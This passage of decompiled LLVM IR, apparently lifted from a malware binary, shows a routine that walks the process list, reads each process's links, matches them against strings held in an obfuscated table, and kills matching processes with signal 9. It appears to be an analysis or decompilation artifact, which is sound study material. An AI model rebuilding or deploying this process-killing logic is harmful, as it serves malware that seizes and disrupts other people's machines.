.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_18fc8.67 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
